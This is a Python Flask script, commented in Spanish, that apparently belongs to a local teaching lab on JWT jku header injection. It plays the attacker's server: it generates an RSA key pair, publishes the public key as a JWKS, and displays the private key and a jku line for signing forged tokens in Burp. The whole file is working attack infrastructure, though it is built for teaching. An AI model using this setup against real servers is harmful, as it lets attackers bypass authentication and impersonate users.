"""
INFRAESTRUCTURA DEL ATACANTE (se levanta sola desde lanzar.py).

Representa la "maquina del atacante". Al arrancar:

  1. genera SU propio par de claves RSA (que el servidor victima NO conoce),
  2. publica su clave PUBLICA como JWKS en  http://localhost:9000/jwks.json
     (esta es la URL que ira dentro del header `jku` del token forjado),
  3. muestra en  http://localhost:9000  una pagina con el par de claves y la
     linea `jku` lista para pegar en el header del JWT (para armar el ataque
     en Burp).

La gracia del ataque: el atacante nunca conoce la clave del servidor, pero
mete en el token un `jku` que apunta a SU propio JWKS. El servidor vulnerable
se baja esa clave y valida con ella => acepta el token como legitimo.

Puerto: 9000.  Uso exclusivamente educativo, en entorno local.
"""
import json

import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from flask import Flask, jsonify, render_template

PUERTO = 9000
JKU_URL = f"http://localhost:{PUERTO}/jwks.json"
KID = "atacante-key-1"

# --- El atacante genera su par de claves al arrancar (solo en su memoria) ---
_clave = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# Clave PRIVADA en PEM (asi se ve una clave privada; sirve para firmar).
PRIVADA_PEM = _clave.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
).decode()

# Clave PUBLICA en PEM.
PUBLICA_PEM = _clave.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
).decode()

# Clave PUBLICA en formato JWK, dentro de un JWKS {"keys": [...]}: es lo que el
# servidor vulnerable se baja del `jku` para validar la firma.
_jwk = json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(_clave.public_key()))
_jwk["kid"] = KID
_jwk["use"] = "sig"
_jwk["alg"] = "RS256"
JWKS = {"keys": [_jwk]}

# Clave PRIVADA en formato JWK: esto es lo que se importa en la extension
# JWT Editor de Burp para firmar el token modificado. Como el JWKS publicado es
# el par de ESTA clave, la firma valida contra el `jku`.
_priv_jwk = json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(_clave))
_priv_jwk["kid"] = KID
_priv_jwk["use"] = "sig"
_priv_jwk["alg"] = "RS256"
PRIVADA_JWK = json.dumps(_priv_jwk, indent=2)

app = Flask(__name__)


@app.route("/jwks.json")
def jwks():
    # El servidor vulnerable va a pedir ESTA clave (por culpa del `jku`).
    return jsonify(JWKS)


@app.route("/")
@app.route("/claves")
def pagina_claves():
    """Pagina 3: muestra el par de claves del atacante y la linea `jku`."""
    return render_template(
        "claves.html",
        jku=JKU_URL,
        kid=KID,
        puerto=PUERTO,
        privada_pem=PRIVADA_PEM,
        publica_pem=PUBLICA_PEM,
        privada_jwk=PRIVADA_JWK,
    )


if __name__ == "__main__":
    print("=" * 60)
    print(f" [ATACANTE] Claves + jku:   http://localhost:{PUERTO}/claves")
    print(f" [ATACANTE] JWKS publicado: {JKU_URL}")
    print("=" * 60)
    app.run(host="0.0.0.0", port=PUERTO)
